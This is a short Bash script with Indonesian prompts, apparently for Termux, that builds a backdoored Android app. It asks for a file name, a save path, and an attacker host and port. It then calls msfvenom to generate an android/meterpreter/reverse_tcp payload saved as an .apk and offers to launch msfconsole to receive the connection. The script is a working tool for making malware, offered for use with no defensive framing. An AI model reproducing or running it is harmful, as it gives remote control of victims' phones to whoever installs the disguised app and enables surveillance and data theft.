blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo $white'╔══════════════════════════════════╗'
echo $white'║'$cyan'      Buat Backdoor Aplikasi'$white'      ║'
echo $white'╠══════════════════════════════════╝'
sleep 2
read -p "║ Masukan nama backdoor = " nama
read -p "║ Simpan di = " int
read -p "║ Masukan LHOST = " host
read -p "║ Masukan PORT = " port
echo "╚═══════════════════════════════════"
sleep 2
echo ''
echo $white"["$green"+"$white"]"$red" Backdoor Sedang Di Buat"$white"...."
sleep 1
echo $cyan"Wait..."$yellow
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /$int/$nama.apk
echo $white"["$green" √ "$white"]"$green" Backdoor Berhasil Di Buat Dan Di Simpan di "$int
echo $yellow''
read -p "Jalankan Metasploit? (y/N)" ex
if [ $ex = y ] || [ $ex = Y ]
then
clear
sleep 1
echo $cyan"Metasploit Di Jalankan..."
echo ''
sleep 1
msfconsole
fi
if [ $ex = n ] || [ $ex = N ]
then
cd /data/data/com.termux/files/home/Metas
sleep 1
sh meta.sh
fi
